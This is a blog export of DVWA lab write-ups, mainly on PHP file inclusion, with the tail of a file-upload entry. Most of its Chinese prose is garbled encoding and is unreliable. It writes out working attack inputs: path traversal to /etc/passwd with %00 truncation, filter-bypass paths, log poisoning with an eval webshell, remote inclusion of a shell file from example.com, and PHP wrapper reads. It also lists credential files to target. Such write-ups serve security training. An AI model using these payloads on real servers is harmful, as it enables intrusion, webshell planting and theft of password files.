&apos;size&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; åˆ†æžå…³é”®ä»£ç åˆ†æž $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); strrpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åŽä¸€æ¬¡å‡ºçŽ°çš„ä½ç½®(å¯¹å¤§å°å†™æ•æ„Ÿï¼‰ã€‚ substr(string,start,length) å‡½æ•°è¿”å›žå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†(å¦‚æžœ start å‚æ•°æ˜¯è´Ÿæ•°ä¸” length å°äºŽæˆ–ç­‰äºŽ startï¼Œåˆ™ length ä¸º 0)ã€‚ ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) getimagesize(string filename) å‡½æ•°ä¼šé€šè¿‡è¯»å–æ–‡ä»¶å¤´ï¼Œè¿”å›žå›¾ç‰‡çš„é•¿ã€å®½ç­‰ä¿¡æ¯ï¼Œå¦‚æžœæ²¡æœ‰ç›¸å…³çš„å›¾ç‰‡æ–‡ä»¶å¤´ï¼Œå‡½æ•°ä¼šæŠ¥é”™ã€‚ å¯ä»¥çœ‹åˆ°å…ˆè¯»å–æ–‡ä»¶åä¸­æœ€åŽä¸€ä¸ªâ€.â€åŽçš„å­—ç¬¦ä¸²ï¼ŒæœŸæœ›é€šè¿‡æ–‡ä»¶åæ¥é™åˆ¶æ–‡ä»¶ç±»åž‹ï¼Œå› æ­¤è¦æ±‚ä¸Šä¼ æ–‡ä»¶åå½¢å¼å¿…é¡»æ˜¯â€.jpgâ€ã€â€.jpegâ€ ã€â€*.pngâ€ä¹‹ä¸€ã€‚åŒæ—¶ï¼Œgetimagesizeå‡½æ•°æ›´æ˜¯é™åˆ¶äº†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å¤´å¿…é¡»ä¸ºå›¾åƒç±»åž‹ã€‚ æ¼æ´žåˆ©ç”¨ç›´æŽ¥ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ ImpossibleFile Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;; //$target_file = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;; $target_file = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; $temp_file = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &apos;image/jpeg&apos; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo &quot;&lt;pre&gt;&lt;a href=&apos;${target_path}${target_file}&apos;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; åˆ†æžmagecreatefromjpeg ( filename ) å‡½æ•°è¿”å›žå›¾ç‰‡æ–‡ä»¶çš„å›¾åƒæ ‡è¯†ï¼Œå¤±è´¥è¿”å›žfalse imagecreatefromjpeg â€” ç”±æ–‡ä»¶æˆ– URL åˆ›å»ºä¸€ä¸ªæ–°å›¾è±¡ã€‚ imagejpeg ( image , filename , quality) ä»Žimageå›¾åƒä»¥filenameä¸ºæ–‡ä»¶ååˆ›å»ºä¸€ä¸ªJPEGå›¾åƒï¼Œå¯é€‰å‚æ•°qualityï¼ŒèŒƒå›´ä»Ž 0ï¼ˆæœ€å·®è´¨é‡ï¼Œæ–‡ä»¶æ›´å°ï¼‰åˆ° 100ï¼ˆæœ€ä½³è´¨é‡ï¼Œæ–‡ä»¶æœ€å¤§ï¼‰ã€‚ imagedestroy( img ) å‡½æ•°é”€æ¯å›¾åƒèµ„æº å¯ä»¥çœ‹åˆ°ï¼ŒImpossibleçº§åˆ«çš„ä»£ç å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œäº†é‡å‘½åï¼ˆä¸ºmd5å€¼ï¼Œå¯¼è‡´%00æˆªæ–­æ— æ³•ç»•è¿‡è¿‡æ»¤è§„åˆ™ï¼‰ï¼ŒåŠ å…¥Anti-CSRF tokené˜²æŠ¤CSRFæ”»å‡»ï¼ŒåŒæ—¶å¯¹æ–‡ä»¶çš„å†…å®¹ä½œäº†ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…æ— æ³•ä¸Šä¼ å«æœ‰æ¶æ„è„šæœ¬çš„æ–‡ä»¶ å‚è€ƒæ¸—é€æµ‹è¯•æ–¹æ³•è®ºä¹‹æ–‡ä»¶ä¸Šä¼  DVWAä¹‹PHPæ–‡ä»¶ä¸Šä¼ æ¼æ´žï¼ˆFile Uploadï¼‰]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
        <tag>File_Upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-File_Inclusion]]></title>
    <url>%2F2018%2F07%2F29%2FDVWA-File_Inclusion%2F</url>
    <content type="text"><![CDATA[Vulnerability: File InclusionIntruduceFile Inclusionï¼Œæ„æ€æ˜¯æ–‡ä»¶åŒ…å«ï¼ˆæ¼æ´žï¼‰ï¼š äº§ç”ŸåŽŸå› ï¼šç”±äºŽå¼€å‘äººå‘˜ç¼–å†™æºç æ—¶ï¼Œè¦å°†é‡å¤ä½¿ç”¨çš„ä»£ç æ’å…¥åˆ°å•ä¸ªçš„æ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨éœ€è¦æ—¶è°ƒç”¨è¿™æ®µä»£ç ï¼›è€Œç”±äºŽå¹¶æœªå¯¹ä»£ç ä¸­å­˜åœ¨æ–‡ä»¶åŒ…å«çš„å‡½æ•°å…¥å£åšè¿‡æ»¤ï¼Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æäº¤æ¶æ„ä»£ç åˆ°æœåŠ¡å™¨å¹¶æ‰§è¡Œã€‚ æ–‡ä»¶åŒ…å«æ¼æ´žæ˜¯â€œä»£ç æ³¨å…¥â€çš„ä¸€ç§ï¼Œå…¶åŽŸç†å°±æ˜¯æ³¨å…¥ä¸€æ®µç”¨æˆ·èƒ½æŽ§åˆ¶çš„è„šæœ¬æˆ–ä»£ç ï¼Œå¹¶è®©æœåŠ¡ç«¯æ‰§è¡Œã€‚â€œä»£ç æ³¨å…¥â€çš„å…¸åž‹ä»£è¡¨å°±æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´žå¯èƒ½å‡ºçŽ°åœ¨JSPã€PHPã€ASPç­‰è¯­è¨€ä¸­ã€‚ åˆ©ç”¨æ¡ä»¶è‹¥è¦æˆåŠŸåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´žè¿›è¡Œæ”»å‡»ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼šWebåº”ç”¨é‡‡ç”¨include/require()ç­‰æ–‡ä»¶åŒ…å«å‡½æ•°é€šè¿‡åŠ¨æ€å˜é‡çš„æ–¹å¼å¼•å…¥éœ€è¦åŒ…å«çš„æ–‡ä»¶ ç”¨æˆ·èƒ½å¤ŸæŽ§åˆ¶è¯¥åŠ¨æ€å˜é‡ æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆåˆ©ç”¨å‰æï¼‰1ã€ç›¸å…³å‡½æ•°å†…çš„å‚æ•°å¯æŽ§ è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆåˆ©ç”¨å‰æï¼‰1ã€ç›¸å…³å‡½æ•°å†…çš„å‚æ•°å¯æŽ§ 2ã€allow_url_fopen = On å½“æœåŠ¡å™¨å¼€å¯allow_url_includeé€‰é¡¹æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡phpçš„æŸäº›ç‰¹æ€§å‡½æ•°ï¼ˆinclude()ï¼Œrequire()å’Œinclude_once()ï¼Œrequire_once()ï¼‰åˆ©ç”¨urlåŽ»åŠ¨æ€åŒ…å«æ–‡ä»¶ï¼Œæ­¤æ—¶å¦‚æžœæ²¡æœ‰å¯¹æ–‡ä»¶æ¥æºè¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œå°±ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚æ–‡ä»¶åŒ…å«æ¼æ´žåˆ†ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´žä¸Žè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´žï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´žæ˜¯å› ä¸ºå¼€å¯äº†phpé…ç½®ä¸­çš„allow_url_fopené€‰é¡¹ï¼ˆé€‰é¡¹å¼€å¯ä¹‹åŽï¼ŒæœåŠ¡å™¨å…è®¸åŒ…å«ä¸€ä¸ªè¿œç¨‹çš„æ–‡ä»¶ï¼‰ã€‚ å¸¸è§åˆ©ç”¨æ–¹å¼PHPåŒ…å«æ¼æ´žç»“åˆä¸Šä¼ æ¼æ´žï¼› PHPåŒ…å«è¯»æ–‡ä»¶ï¼› PHPåŒ…å«å†™æ–‡ä»¶ï¼› PHPåŒ…å«æ—¥å¿—æ–‡ä»¶ï¼› PHPæˆªæ–­åŒ…å«ï¼› PHPå†…ç½®ä¼ªåè®®åˆ©ç”¨ã€‚ Low File Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; ?&gt; åˆ†æžæœåŠ¡å™¨ç«¯æœªå¯¹pageå‚æ•°åšä»»ä½•è¿‡æ»¤å’Œæ£€æŸ¥ ç‚¹å‡» file1.php æ¼æ´žåˆ©ç”¨1ã€æœ¬åœ°åŒ…å«ã€æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯ã€ç»å¯¹è·¯å¾„ç›´æŽ¥å°è¯•è®¿é—® /etc/passwd Xamppçš„phpçŽ¯å¢ƒé…ç½®æ–‡ä»¶ï¼š Apacheï¼š\xampp\apache\conf\httpd.conf PHPï¼š\xampp\php\php.ini MySQLï¼š\xampp\mysql\bin\my.ini phpMyAdminï¼š\xampp\phpMyAdmin\config.inc.php FileZilla FTPï¼š\xampp\FileZillaFTP\FileZilla Server.xml Mercury Mailï¼š.\xampp\MercuryMail\MERCURY.INI Sendmailï¼š\xampp\sendmail\sendmail.ini ä¸»æ–‡ä»¶éƒ½å­˜æ”¾åœ¨ htdocs æ–‡ä»¶å¤¹ä¸­ï¼ˆ\xampp\htdocsï¼‰ å°è¯•è¯»å–php.ini æˆåŠŸè¯»å–ï¼Œå¯ä»¥çœ‹åˆ° magic_quotes_gpc = Off allow_url_fopen on allow_url_include on é…ç½®æ–‡ä»¶ä¸­çš„Magic_quote_gpcé€‰é¡¹ä¸ºoffã€‚åœ¨phpç‰ˆæœ¬å°äºŽ5.3.4çš„æœåŠ¡å™¨ä¸­ï¼Œå½“Magic_quote_gpcé€‰é¡¹ä¸ºoffæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ–‡ä»¶åä¸­ä½¿ç”¨%00è¿›è¡Œæˆªæ–­ï¼Œä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶åä¸­%00åŽçš„å†…å®¹ä¸ä¼šè¢«è¯†åˆ« &lt;?php include(&quot;inc/&quot; . $_GET[&apos;file&apos;] . &quot;.htm&quot;); ?&gt; %00æˆªæ–­ï¼š ?file=../../../../../../../../../etc/passwd%00 (éœ€è¦ magic_quotes_gpc=offï¼ŒPHPå°äºŽ5.3.4æœ‰æ•ˆ) %00æˆªæ–­ç›®å½•éåŽ†ï¼š ?file=../../../../../../../../../var/www/%00 (éœ€è¦ magic_quotes_gpc=offï¼Œunixæ–‡ä»¶ç³»ç»Ÿï¼Œæ¯”å¦‚FreeBSDï¼ŒOpenBSDï¼ŒNetBSDï¼ŒSolaris) å½“æœåŠ¡å™¨çš„phpé…ç½®ä¸­ï¼Œé€‰é¡¹allow_url_fopenä¸Žallow_url_includeä¸ºå¼€å¯çŠ¶æ€æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå…è®¸åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå¦‚æžœå¯¹æ–‡ä»¶æ¥æºæ²¡æœ‰æ£€æŸ¥çš„è¯ï¼Œå°±å®¹æ˜“å¯¼è‡´ä»»æ„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ç›¸å¯¹è·¯å¾„ä¿®æ”¹å‚æ•° file1.phpä¸ºä¸€äº›å¸¸è§é…ç½®æ–‡ä»¶è·¯å¾„ /dvwa/vulnerabilities/fi/?page=../../../../apache/conf/httpd.conf /dvwa/vulnerabilities/fi/?page=../../../../mysql/bin/my.ini 2ã€åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶åœ¨æ—¥å¿—æ–‡ä»¶ä¸­å†™å…¥phpinfo http://192.168.10.11/dvwa/vulnerabilities/fi/?page=C:/xampp/apache/logs/access.log å†™å…¥ä¸€å¥è¯ &lt;?php @eval($_POST[â€˜Cknifeâ€™]);?&gt; ä¸€å¼€å§‹ç”¨çš„èœåˆ€æ²¡è¿žä¸Šï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯å‡ºäº†å•¥é—®é¢˜ï¼Œæ¢äº†æŠŠèœåˆ€è¿žä¸Šäº† 3ã€è¿œç¨‹æ–‡ä»¶åŒ…å«è¿œç¨‹ä»£ç æ‰§è¡Œï¼š ?file=[http|https|ftp]://example.com/shell.txt (éœ€è¦allow_url_fopen=Onå¹¶ä¸” allow_url_include=On) é¦–å…ˆåœ¨æˆ‘ä»¬è‡ªå·±çš„ä¸»æœºä¸Šåˆ¶ä½œä¸€ä¸ªåŒ…å«å†™å…¥ä¸€å¥è¯çš„txtæ–‡æœ¬ &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;), &quot;&lt;?php eval(\$_POST[111]);?&gt;&quot;);?&gt; åœ¨è¿œç¨‹åŒ…å«æˆ‘ä»¬æž„é€ å¥½çš„test.txtæ–‡æœ¬ï¼Œé€šè¿‡è¯¥æ–‡æœ¬åœ¨ç›®æ ‡ä¸»æœºä¸Šå†™å…¥ä¸€å¥è¯èœåˆ€è¿žæŽ¥ 4ã€é…åˆä¸Šä¼ æ¼æ´žå†™webshellå’Œæ–‡ä»¶ä¸Šä¼ æ¼æ´žæˆ–è€…SQLæ³¨å…¥æ¼æ´žç­‰ä¸€åŒåˆ©ç”¨ï¼Œé€šè¿‡åˆ©ç”¨å‰é¢çš„æ¼æ´žå°†ä¸€å¥è¯æœ¨é©¬shell.phpæ–‡ä»¶ä¸Šä¼ åˆ°WebæœåŠ¡å™¨ä¸­ï¼Œç„¶åŽå†é€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´žåŒ…å«å‡ºçŽ°ä»Žè€Œå¾—åˆ°shell 5ã€ä½¿ç”¨PHPå°è£…åè®®è¯»å–æ–‡ä»¶å’Œå†™å…¥PHPæ–‡ä»¶####### 1ã€è¯»å–æ–‡ä»¶ï¼šå…ˆçœ‹çœ‹è¯»å–æ–‡ä»¶ï¼Œå¦‚è¾“å…¥pageå‚æ•°å€¼ä¸ºï¼š php://filter/read=convert.base64-encode/resource=../../../../mysql/bin/my.ini 2ã€å†™å…¥æ–‡ä»¶ï¼šåˆ©ç”¨phpæµinputï¼š ?file=php://input (éœ€è¦allow_url_include=On) MiddleFile Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Input validation $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; åˆ†æžä½¿ç”¨str_replaceå‡½æ•°æ˜¯æžå…¶ä¸å®‰å…¨çš„ï¼Œå› ä¸ºå¯ä»¥ä½¿ç”¨åŒå†™å åŠ ç»•è¿‡æ›¿æ¢è§„åˆ™ã€‚ å°†è¾“å…¥çš„urlå‚æ•°ä¸­åŒ…å«çš„â€œhttp://â€ã€â€œhttps://â€ã€â€œ../â€ã€â€œ..\â€å­—ç¬¦ä¸²æ›¿æ¢æˆç©ºçš„å­—ç¬¦ä¸²ï¼Œå³è¿‡æ»¤äº†è¿œç¨‹æ–‡ä»¶åŒ…å«å’Œç›¸å¯¹è·¯å¾„ï¼Œå¯¹äºŽæœ¬åœ°æ–‡ä»¶ç»å¯¹è·¯å¾„åŒ…å«å¹¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼›å¯¹äºŽè¿™ä¸ªæ›¿æ¢å‡½æ•°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åµŒå¥—å åŠ æ¥ç»•è¿‡ æ¼æ´žåˆ©ç”¨ä½¿ç”¨åµŒå¥—å åŠ ç»•è¿‡ç»å¯¹è·¯å¾„è¿‡æ»¤../../../../apache/conf/httpd.conf æˆ‘ä»¬æž„é€ å¦‚ä¸‹åµŒå¥—çš„è·¯å¾„å°±å¯ä»¥ç»•è¿‡äº† ..././..././..././..././apache/conf/httpd.conf ä½¿ç”¨åµŒå¥—å åŠ ç»•è¿‡è¿œç¨‹æ–‡ä»¶åŒ…å«è¿‡æ»¤ HighFile Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Input validation if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; åˆ†æžnmatch() å‡½æ•°æ ¹æ®æŒ‡å®šçš„æ¨¡å¼æ¥åŒ¹é…æ–‡ä»¶åæˆ–å­—ç¬¦ä¸²ã€‚ æ­¤å‡½æ•°å¯¹äºŽæ–‡ä»¶åå°¤å…¶æœ‰ç”¨ï¼Œä½†ä¹Ÿå¯ä»¥ç”¨äºŽæ™®é€šçš„å­—ç¬¦ä¸²ã€‚æ™®é€šç”¨æˆ·å¯èƒ½ä¹ æƒ¯äºŽ shell æ¨¡å¼æˆ–è€…è‡³å°‘å…¶ä¸­æœ€ç®€å•çš„å½¢å¼ â€˜?â€™ å’Œ â€˜*â€™ é€šé…ç¬¦ï¼Œå› æ­¤ä½¿ç”¨ fnmatch() æ¥ä»£æ›¿ ereg() æˆ–è€… preg_match() æ¥è¿›è¡Œå‰ç«¯æœç´¢è¡¨è¾¾å¼è¾“å…¥å¯¹äºŽéžç¨‹åºå‘˜ç”¨æˆ·æ›´åŠ æ–¹ä¾¿ è¯¥å‡½æ•°å°†åªåŒ¹é…fileå¼€å¤´å’Œåä¸ºinclude.phpçš„æ–‡ä»¶ï¼Œæœ¬è´¨å°±æ˜¯åˆ©ç”¨ç™½åå•æœºåˆ¶è¿›è¡Œè¿‡æ»¤ï¼Œä¸è¿‡ä¹Ÿä¸å®Œå…¨æ˜¯ç™½åå•ï¼Œå…¶ä»–æ–‡ä»¶ä¸€å¾‹æŠ¥é”™ï¼Œçœ‹ä¼¼ä¸èƒ½ç»•è¿‡ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨fileåè®®ç»•è¿‡é˜²æŠ¤ç­–ç•¥ã€‚ æ¼æ´žåˆ©ç”¨fileåè®®ç»•è¿‡ ImpossibleFile Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Only allow include.php or file{1..3}.php if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; åˆ†æžä½¿ç”¨äº†ç™½åå•è¿›è¡Œæ£€æŸ¥æ˜¯å¦ä¸ºå¯ä¿¡çš„æ–‡ä»¶ï¼Œæš‚æ— åˆ©ç”¨æ–¹æ³• ç³»ç»Ÿå¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„ï¼šWindowsç³»ç»ŸC:\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ C:\Windows\System32\inetsrv\Metabase.xml //IISé…ç½®æ–‡ä»¶ C:\Windows\repair\sam //å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  C:\Programe Files\mysql\my.ini //Mysqlé…ç½® C:\Programe Files\mysql\data\mysql\use.MYD //Mysql root C:\Windows\php.ini //php é…ç½®ä¿¡æ¯ C:\Windows\mysql.ini // Mysqlé…ç½®æ–‡ä»¶ C:\mysql\data\mysql\user.MYD //å­˜å‚¨äº†mysql.userè¡¨ä¸­çš„æ•°æ®åº“è¿žæŽ¥å¯†ç  C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //å­˜å‚¨äº†è™šæ‹Ÿä¸»æœºç½‘ç«™è·¯å¾„å’Œå¯†ç  C:\Program Files\Serv-U\ServUDaemon.ini Linuxç³»ç»Ÿ/etc/passwd //ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶ /etc/shadow //å¯†ç  /usr/local/app/apache2/conf/httpd.conf //apache2é»˜è®¤è®¾ç½®æ–‡ä»¶ /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //è™šæ‹Ÿä¸»æœºè®¾ç½® /usr/local/app/php5/lib/php.ini //PHPç›¸å…³è®¾ç½® /etc/httpd/conf/httpd.conf //apacheé…ç½®æ–‡ä»¶ /etc/my.cnf //Mysqlçš„é…ç½®æ–‡ä»¶ /etc/sysconfig/iptables //ä»Žä¸­å¾—åˆ°é˜²ç«å¢™è§„åˆ™ç­–ç•¥ /etc/rsyncd.conf //åŒæ­¥ç¨‹åºé…ç½®æ–‡ä»¶ /etc/sysconfig/network-scripts/ifcfg-eth0 //æŸ¥çœ‹IP. /etc/redhat-release //ç³»ç»Ÿç‰ˆæœ¬ /etc/issue /etc/issue.net æ£€æµ‹æ–¹æ³•1ã€æ‰¾åˆ°æœ‰åŒ…å«å‡½æ•°çš„é¡µé¢ï¼Œå¯¹å‡½æ•°å†…å®¹è¿›è¡Œæ›¿æ¢æŸ¥çœ‹ç»“æžœï¼› æ³¨æ„pathå‚æ•°ï¼Œä¸€èˆ¬å¯èƒ½çš„å˜é‡åï¼š srcã€ filenameã€ fileã€ pathã€filepathã€uriâ€¦â€¦ 2ã€å¯ä»¥ä½¿ç”¨å·¥å…·æ¥ä»£æ›¿æ‰‹å·¥çš„è¿‡ç¨‹ï¼Œå¦‚Kadimusã€Burpsuiteçš„æ’ä»¶LFI scanner checksç­‰ï¼› 3ã€ç™½ç›’æµ‹è¯•æ—¶ï¼Œå¯ä»¥åœ¨æºä»£ç ä¸­æŸ¥çœ‹allow_url_fopenã€allow_url_includeç­‰æ•æ„Ÿå‡½æ•°æ˜¯å¦å¼€å¯ã€‚ æ–‡ä»¶åŒ…å«é˜²æŠ¤ä»£ç å±‚1.ä¸¥æ ¼åˆ¤æ–­åŒ…å«çš„å‚æ•°æ˜¯å¦å¤–éƒ¨å¯æŽ§ï¼Œå› ä¸ºæ–‡ä»¶åŒ…å«æ¼æ´žåˆ©ç”¨æˆåŠŸä¸Žå¦çš„å…³é”®ç‚¹å°±åœ¨äºŽè¢«åŒ…å«çš„æ–‡ä»¶æ˜¯å¦å¯è¢«å¤–éƒ¨æŽ§åˆ¶ï¼› 2.è·¯å¾„é™åˆ¶ï¼šé™åˆ¶è¢«åŒ…å«çš„æ–‡ä»¶åªèƒ½åœ¨æŸä¸€æ–‡ä»¶å¤¹å†…ï¼Œä¸€å®šè¦ç¦æ­¢ç›®å½•è·³è½¬å­—ç¬¦ï¼Œå¦‚ï¼šâ€œ../â€ï¼› 3.åŒ…å«æ–‡ä»¶éªŒè¯ï¼šéªŒè¯è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯å¦æ˜¯ç™½åå•ä¸­çš„ä¸€å‘˜ï¼› 4.å°½é‡ä¸è¦ä½¿ç”¨åŠ¨æ€åŒ…å«ï¼Œå¯ä»¥åœ¨éœ€è¦åŒ…å«çš„é¡µé¢å›ºå®šå†™å¥½ï¼Œå¦‚ï¼šinclude(&quot;head.php&quot;);ã€‚ 5.å°½é‡ä¸ä½¿ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œå¦‚æžœä¸šåŠ¡æ— æ³•é¿å…ï¼Œå°½é‡æ ¡éªŒè¿œç¨‹ä¸»æœºåŸŸåã€‚ ä½¿ç”¨ç™½åå•æŒ‡å®šèƒ½åŒ…å«çš„æ–‡ä»¶ &lt;?php $filename = $_GET[&apos;filename&apos;]; switch($filename){ case &apos;head&apos;; case &apos;foot&apos;; case &apos;main&apos;; include &apos;var/www/html/&apos;.$filename.&apos;php&apos;; break; default: include &apos;/var/www/html/main.php&apos;; } ?&gt; è®¾ç½®open_basedirçš„å€¼å°†å…è®¸åŒ…å«çš„æ–‡ä»¶é™å®šåœ¨æŸä¸€ç‰¹å®šç›®å½•å†…ã€‚ æ³¨ï¼šopen_basediræ˜¯ç›®å½•å‰ç¼€open_basedir=/var/www/testopen_basedir=/var/www/test/ ç¬¬ä¸€ç§æƒ…å†µå¯ä»¥å…è®¸/var/www/test ã€ /var/www/test123 ç­‰ç›®å½•å¦‚æžœè¦ä¸¥æ ¼é™åˆ¶ç›®å½•åº”ä½¿ç”¨ç¬¬äºŒç§ å‚è€ƒæ–°æ‰‹æŒ‡å—ï¼šDVWA-1.9å…¨çº§åˆ«æ•™ç¨‹ä¹‹File Inclusion DVWAä¹‹PHPæ–‡ä»¶åŒ…å«æ¼æ´žï¼ˆFile Inclusionï¼‰ æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ž&amp;&amp;PHPåˆ©ç”¨åè®®&amp;&amp;å®žè·µæºç  phpæ–‡ä»¶åŒ…å«æ¼æ´ž]]></content>
      <tags>
        <tag>DVWA</tag>
        <tag>practice</tag>
        <tag>File_Inclusion</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-CSRF]]></title>
    <url>%2F2018%2F07%2F26%2FDVWA-CSRF%2F</url>
